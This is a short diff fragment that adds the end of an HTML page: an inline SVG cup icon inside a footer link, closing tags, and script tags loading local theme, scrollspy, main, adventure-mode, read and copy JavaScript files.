+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1" /><path d="M2 8h16v5a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4Z" /><line x1="6" y1="2" x2="6" y2="4" /><line x1="10" y1="2" x2="10" y2="4" /><line x1="14" y1="2" x2="14" y2="4" /></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../js/theme.js"></script>
+    <script src="../js/scrollspy.js"></script>
+    <script src="../js/main.js"></script>
+    <script src="../js/adventure-mode.js"></script>
+    <script src="../js/read.js"></script>
+    <script src="../js/copy.js"></script>
+</body>
+</html>
